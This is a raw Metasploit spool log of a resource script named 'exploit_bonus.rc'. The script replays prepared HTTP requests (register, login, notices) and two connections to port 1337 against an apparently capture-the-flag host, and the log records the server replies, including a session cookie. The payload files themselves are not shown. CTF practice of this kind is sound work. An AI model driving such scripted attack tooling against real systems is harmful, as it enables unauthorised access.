[1m[34m[*][0m Spooling to file msf.log...
[1m[34m[*][0m resource (exploit_bonus.rc)> Ruby Code (640 bytes)
resource (exploit_bonus.rc)> connect -s -C -i msf_reg.txt 08fccd581446cc9a.julec.tf 443
[0m[1m[34m[*][0m Connected to 08fccd581446cc9a.julec.tf:443 (via: 192.168.1.131:63315)
HTTP/1.1 400 Bad Request
Server: openresty
Date: Fri, 12 Dec 2025 16:17:47 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 35
Connection: close
X-Powered-By: Express
ETag: W/"23-s89ZNsbwl/SWzRTLqr0n/5s0dvs"

{"error":"Elf name already exists"}resource (exploit_bonus.rc)> connect -s -C -i msf_login.txt 08fccd581446cc9a.julec.tf 443
[0m[1m[34m[*][0m Connected to 08fccd581446cc9a.julec.tf:443 (via: 192.168.1.131:63316)
HTTP/1.1 200 OK
Server: openresty
Date: Fri, 12 Dec 2025 16:17:52 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 53
Connection: close
X-Powered-By: Express
ETag: W/"35-CDeB/GXrG4gb4WkHf6ccUDEwOpY"
Set-Cookie: connect.sid=s%3AKk_ThBiS2QfcDT7pjxwNBLMowgXI04TH.7uwA2d1Q2zpiRCa9oXoyK72WM%2FT8DiOAmxltDjtBS7w; Path=/; HttpOnly
X-Served-By: 08fccd581446cc9a.julec.tf

{"success":true,"message":"Welcome to the workshop!"}[1m[34m[*][0m resource (exploit_bonus.rc)> Ruby Code (948 bytes)
resource (exploit_bonus.rc)> connect -s -C -i msf_notices.txt 08fccd581446cc9a.julec.tf 443
[0m[1m[34m[*][0m Connected to 08fccd581446cc9a.julec.tf:443 (via: 192.168.1.131:63317)
HTTP/1.1 401 Unauthorized
Server: openresty
Date: Fri, 12 Dec 2025 16:17:52 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 29
Connection: close
X-Powered-By: Express
ETag: W/"1d-TthZhBRJQAzVgIhlWqxc3frMMMg"

{"error":"Not authenticated"}resource (exploit_bonus.rc)> connect -C -i msf_bonus_plain.txt 08fccd581446cc9a.julec.tf 1337
[0m[1m[34m[*][0m Connected to 08fccd581446cc9a.julec.tf:1337 (via: 192.168.1.131:63318)
resource (exploit_bonus.rc)> connect -C -i msf_bonus_tls.txt 08fccd581446cc9a.julec.tf 1337
[0m[1m[34m[*][0m Connected to 08fccd581446cc9a.julec.tf:1337 (via: 192.168.1.131:63319)
resource (exploit_bonus.rc)> spool off
[0m